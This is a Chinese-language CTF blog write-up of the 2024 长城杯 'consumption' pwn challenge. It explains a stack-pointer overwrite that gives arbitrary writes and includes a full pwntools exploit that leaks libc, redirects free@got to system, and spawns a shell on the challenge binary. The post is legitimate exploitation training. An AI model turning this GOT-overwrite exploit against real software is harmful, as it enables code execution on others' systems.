---
date: 2024-8-22 10:22:03
layout: post
title: 2024 长城杯初赛 consumption writeup
subtitle: 
description: >-
    记录一下一点奇怪的 leak
image: >-
  /assets/img/uploads/consumption.png
optimized_image: >-
  /assets/img/uploads/consumption.png
category: ctf
tags:
  - ctf
  - pwn
  - 2024 长城杯
  - consumption
author: rosayxy
paginate: true
---

# 2024 长城杯初赛 consumption writeup
赛场上把两道简单 pwn 题做了，这道题找到了 crash 点，队友把这道题出了qaq，当时和队友讨论的时候有一些踩坑的思路，就在这里记一下了 hhh（但是这个题也是简单题啊xsl）    
当时一直在思考怎么 leak libc，**因为是32位的程序，所以爆破代价较低**，直接采用爆破的方式了，直到晚上又和队友讨论 想了两种 leak 的方法并且都打出来了        
从一年前出 THUCTF 题的时候就在想任意地址写任意值的打法，这道题就是如此    

## 题目
一开始在看常规的堆题漏洞，都没发现，在 main 函数中注意到一个比较奇怪的点
```c
 char s[1280]; // [esp+28h] [ebp-100Ch] BYREF
  int v13[64]; // [esp+528h] [ebp-B0Ch] BYREF
  _DWORD stack_buf[643]; // [esp+628h] [ebp-A0Ch] BYREF

  stack_buf[641] = &argc;
  stack_buf[640] = __readgsdword(0x14u);
  init();
  while ( 1 )
  {
    menu();
    v13[0] = (int)stack_buf;                    // stack_buf
    __isoc99_scanf("%4094s", s);
    // ...

```
这里看到我们写的 json 的内容可以覆盖到先前往 v13[0] 写入的 stack_buf 内容   
在后续的 add 函数中，会把 json 中的 size 域写入 *stack_ptr，然后根据 size 是否合法去分配堆空间，写内容或者返回     
所以当我们把 stack_buf 覆盖为一个已知地址时，可以写任意值，从而**算是有一个任意地址写任意值原语**     
这里踩到的一个坑是：一开始先入为主的不知道为啥认为那个输出"out!!"就返回了的函数具有 `exit` 功能，可能是受 main 函数中 `puts_out(); exit(-1);` 的影响，之前也有题目这样认错过，可能是 rosayxy 的奇怪脑回路吧哈哈哈    
![alt_text](/assets/img/uploads/consumption1.jpg)
## 思路
- 赛场上思路：先把 `memcpy` 覆盖为 `ret`，       
  否则后面写 libc 地址的时候，有 **stack_ptr=libc_addr ,因为 `**controllable_addr<0`，所以会继续执行如下代码
```c
  heap[v4] = (int)malloc(**stack_ptr);
  length[v4] = **stack_ptr;
  memcpy((void *)heap[v4], content, **stack_ptr);
```
而 malloc 可能给不到这么大的空间，会返回一个 nullptr，所以 memcpy 的第一个参数为空，直接 segfault 了       
然后把 free@got 改成 libc system address，进行 libc 地址爆破 就可以了     

- rosayxy 思路：
  - 第一次漏洞利用：改 memcpy 为 puts 函数 第二轮正常 malloc 泄露 libc 地址（前提是在一开始搞一个 unsorted bin），泄露堆上 libc 地址
  - 把 memcpy 改成 ret，不然 puts 空指针也会 segfault
  - 第二次漏洞利用： free@got 覆盖为 system
- 队友 k4ra5u 赛后思路：
  - 把 bss 段 heap 中的堆指针改成 got 表地址，直接用它自带的 show 函数泄露
  - free@got 覆盖为 system
  - 感觉应该是最巧妙的一种思路哈哈哈 ~ tql

## exp
rosayxy 思路的 exp
```py
from time import sleep
from pwn import*
context(arch='i386', os='linux', log_level='debug')
json={"idx": 1,"choice": "1","size": "100","content": "This is the content for option A."}
p=process("./consumption")
libc=ELF("./libc.so.6")
# gdb.attach(p)
# pause()

# 第一次改 memcpy 为 printf 第二轮正常 malloc 泄露 libc 地址（前提是在一开始搞一个 unsorted bin）
# 第二次写 free_got 为 system

p.recvuntil("5.exit\t\n")
payload = b'{"choice":"1","idx":0,"size":"1023","content":"aaaaa"}'
p.sendline(payload)
p.recvuntil("5.exit\t\n")
payload=b'{"choice":"1","idx":1,"size":"32","content":"/bin/sh;"}'
p.sendline(payload)
payload=b'{"choice":"2","idx":0,"size":"32","content":"aaaaa"}'
# elevate vuln

p.recvuntil("5.exit\t\n")
p.sendline(payload)
payload = b'{"choice":"1","idx":0,"size":"134517248","content":"","blabla":"' # size 写成 puts 地址
payload = payload.ljust(1280,b'A')
payload +=p32(0x8051AB4)
payload +=b'"}'
p.recvuntil("5.exit\t\n")
p.sendline(payload)
# gdb.attach(p)
# pause()
p.recvuntil("5.exit\t\n")
payload = b'{"choice":"1","idx":2,"size":"8","content":"a"}'
p.sendline(payload)

leak=u32(p.recv(4))
print(hex(leak))
# f7f6d778 0xf7d84000
libc_base = leak - 0xf6d778+0xd84000
print(hex(libc_base))
system=libc_base+libc.symbols['system']
free_got=0x8051AB0
# 改 got 表
# gdb.attach(p)
# pause()

payload = b'{"choice":"1","idx":0,"size":"134518550","content":"","blabla":"' # size 写成 retn 地址 防止后面 crash 了
payload = payload.ljust(1280,b'A')
payload +=p32(0x8051AB4)
payload +=b'"}'

p.recvuntil("5.exit\t\n")
p.sendline(payload)

p.recvuntil("5.exit\t\n")
payload=b'{"choice":"1","idx":0,"size":"'+str(-0x100000000+system).encode("latin-1")+b'","content":"","blabla":"'
payload = payload.ljust(1280,b'A')
payload +=p32(free_got)
payload +=b'"}'
p.sendline(payload)

p.recvuntil("5.exit\t\n")
payload=b'{"choice":"2","idx":1,"size":"8","content":"a"}'
p.sendline(payload)
p.interactive()
```

## 总结
本题总体不难，但是可能还是题练少了熟练度不太够    
感觉自由度挺高的，玩一些花活还是开心的qaq    
题目完整链接见 [这里](/attachments/consumption.zip)    